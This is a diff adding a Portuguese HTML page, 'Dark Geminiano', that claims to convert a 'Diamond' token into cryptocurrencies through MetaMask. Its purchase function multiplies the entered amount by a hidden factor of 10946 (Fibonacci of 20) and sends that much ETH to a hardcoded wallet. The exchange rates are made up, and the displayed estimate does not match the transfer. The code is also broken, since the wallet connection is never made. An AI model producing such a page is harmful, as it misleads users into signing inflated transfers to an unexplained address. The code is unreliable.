@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="z.png" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark Geminiano</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #121212;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin: 20px 0;
+            color: #fff;
+            text-align: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background-color: #1e1e1e;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
+            transition: all 0.3s ease;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #e0e0e0;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid #3c3c3c;
+            background-color: #2a2a2a;
+            color: #e0e0e0;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #4CAF50;
+        }
+
+        .buttons-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .buttons-group button {
+            padding: 12px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #fff;
+            border: none;
+            transition: background-color 0.3s ease;
+            text-align: center;
+        }
+
+        .btn-google-red {
+            background-color: #ea4335;
+        }
+
+        .btn-google-red:hover {
+            background-color: #c23628;
+        }
+
+        .alert {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 6px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .alert.success {
+            background-color: #34a853;
+        }
+
+        .alert.info {
+            background-color: #1a73e8;
+        }
+
+        footer {
+            width: 100%;
+            padding: 20px;
+            background-color: #1e1e1e;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #e0e0e0;
+            margin-top: 20px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+        }
+
+        footer a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Dark Geminiano</h1>
+
+    <div class="container">
+        <div class="form-group">
+            <label for="amount">Valor em Diamond:</label>
+            <input type="number" id="amount" placeholder="Digite o valor em Diamond">
+        </div>
+        <div class="form-group">
+            <label for="nivel">Nível Fibonacci (Escala Máxima Padrão):</label>
+            <input type="text" id="nivel" value="20" disabled placeholder="Valor máximo Fibonacci">
+        </div>
+        <div class="form-group">
+            <label for="currency-option">Escolha a conversão:</label>
+            <select id="currency-option">
+                <option value="usd-btc">Diamond para Bitcoin (BTC)</option>
+                <option value="diamond-btc">Diamond para BTC</option>
+                <option value="diamond-solana">Diamond para Solana</option>
+                <option value="diamond-eth">Diamond para Ethereum</option>
+                <option value="diamond-cardano">Diamond para Cardano (ADA)</option>
+            </select>
+        </div>
+
+        <div class="buttons-group">
+            <button class="btn-google-red" onclick="comprarComMetaMask()">Comprar com MetaMask</button>
+        </div>
+
+        <div id="calculated-value" class="alert info"></div>
+        <div id="alert" class="alert success"></div>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Lucas Januário. Todos os direitos reservados. <a href="#">Política de Privacidade</a></p>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.0.0/dist/ethers.umd.min.js"></script>
+
+    <script>
+        let provider;
+        let signer;
+        const walletAddress = "0x5ac8de4d32cb2e29acb4c7ee07ddce1df348a6cb"; // Endereço da carteira de destino
+        const maxFibonacciLevel = 20; // Nível máximo Fibonacci
+
+        // Conectar MetaMask
+        async function connectMetaMask() {
+            if (window.ethereum) {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []); // Solicitar contas
+                signer = provider.getSigner();
+                showAlert('Conexão com MetaMask bem-sucedida!', 'success');
+            } else {
+                alert('MetaMask não encontrado. Instale o MetaMask para continuar.');
+            }
+        }
+
+        // Calcular o valor a ser transferido
+        function calcularValorDark() {
+            const amount = parseFloat(document.getElementById('amount').value);
+            const currencyOption = document.getElementById('currency-option').value;
+
+            if (isNaN(amount) || amount <= 0) {
+                alert('Por favor, insira um valor válido.');
+                return;
+            }
+
+            const fibonacciValue = fibonacciGeminiana(maxFibonacciLevel); // Usando sempre o valor máximo
+            let exchangeRate;
+
+            switch (currencyOption) {
+                case 'usd-btc': exchangeRate = 0.000035; break;
+                case 'diamond-btc': exchangeRate = 0.0005; break;
+                case 'diamond-solana': exchangeRate = 0.05; break;
+                case 'diamond-eth': exchangeRate = 0.003; break;
+                case 'diamond-cardano': exchangeRate = 0.07; break;
+                default: exchangeRate = 1;
+            }
+
+            const darkValue = amount * fibonacciValue * exchangeRate;
+            showAlert(`Valor Dark Calculado: ${darkValue.toFixed(8)} ETH`, 'info');
+        }
+
+        // Função de Fibonacci
+        function fibonacciGeminiana(nivel) {
+            if (nivel <= 1) return 1;
+            let a = 1, b = 1, temp;
+            for (let i = 2; i <= nivel; i++) {
+                temp = a + b;
+                a = b;
+                b = temp;
+            }
+            return b;
+        }
+
+        // Função de compra via MetaMask
+        async function comprarComMetaMask() {
+            const amount = parseFloat(document.getElementById('amount').value);
+
+            if (isNaN(amount) || amount <= 0) {
+                alert('Por favor, insira um valor válido.');
+                return;
+            }
+
+            const fibonacciValue = fibonacciGeminiana(maxFibonacciLevel);
+            const totalAmount = amount * fibonacciValue;
+
+            try {
+                // Enviar a transação para o endereço da carteira fornecido
+                const transaction = await signer.sendTransaction({
+                    to: walletAddress, // Endereço do recebedor (sua carteira)
+                    value: ethers.utils.parseEther(totalAmount.toString()) // Valor em ETH
+                });
+                await transaction.wait();
+                showAlert(`Compra realizada com sucesso! Hash: ${transaction.hash}`, 'success');
+            } catch (error) {
+                console.error(error);
+                showAlert('Erro ao realizar a compra via MetaMask', 'info');
+            }
+        }
+
+        // Função para mostrar alertas
+        function showAlert(message, type) {
+            const alertBox = type === 'success' ? document.getElementById('alert') : document.getElementById('calculated-value');
+            alertBox.textContent = message;
+            alertBox.classList.add(type);
+            alertBox.style.display = 'block';
+
+            setTimeout(() => {
+                alertBox.style.display = 'none';
+            }, 3000);
+        }
+    </script>
+
+</body>
+</html>
